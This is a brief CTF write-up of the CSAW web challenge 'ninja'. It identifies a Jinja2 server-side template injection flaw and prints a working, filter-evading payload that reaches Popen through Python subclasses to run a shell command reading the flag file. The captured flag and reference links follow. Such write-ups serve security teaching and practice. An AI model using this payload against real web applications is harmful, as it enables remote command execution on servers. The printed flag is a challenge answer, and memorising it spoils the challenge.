# ninja
Category: web  
Description: Hey guys come checkout this website i made to test my ninja-coding skills.  
http://web.chal.csaw.io:5000  
_______________________________________________________________  
Type: SSTI  
Template Engine: Jinja2  
payloads: `{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr(['\x5f\x5f','ba','se','\x5f\x5f']|join)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}`  
flag: flag{m0mmy_s33_1m_4_r34l_n1nj4}  
Sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md  https://infosecwriteups.com/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e
